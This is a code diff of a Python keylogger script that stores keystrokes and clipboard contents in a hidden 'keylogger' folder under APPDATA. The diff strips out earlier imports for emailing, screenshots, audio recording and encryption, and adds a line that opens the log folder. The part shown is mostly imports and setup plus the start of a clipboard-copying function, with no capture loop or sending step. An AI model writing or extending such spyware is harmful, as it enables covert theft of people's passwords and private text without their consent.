@@ -1,57 +1,22 @@
-from email.message import EmailMessage
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
-from threading import Timer
-import time
-from resettabletimer import ResettableTimer
-from os import access
-import mailslurp_client
-from requests import options
-from smtplib import SMTP
-from threading import Timer
-import time
-from email.message import EmailMessage
-
-from os import access
-import mailslurp_client
-from requests import options
-from smtplib import SMTP
-
-import socket
-import platform
-
 import win32clipboard
-
 from pynput.keyboard import Key, Listener
-
 import os
-
-from cryptography.fernet import Fernet
-
-from scipy.io.wavfile import write
-import sounddevice as sd
-
+from os import access
+keys_information = "key_log.txt"
+clipboard_information = "clipboard.txt"
 import getpass
 from requests import get
 
-from multiprocessing import Process, freeze_support
-from PIL import ImageGrab
-
-keys_information = "key_log.txt"
-system_information= "systeminfo.txt"
-screenshot_information= "screenshot.png"
-clipboard_information = "clipboard.txt"
-
 file_path = os.getenv('APPDATA')
+
 try:
     os.mkdir(file_path + '\\keylogger')
 except:
     pass
 
+
 extend="\\keylogger\\"
+os.startfile(file_path+extend)
 
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
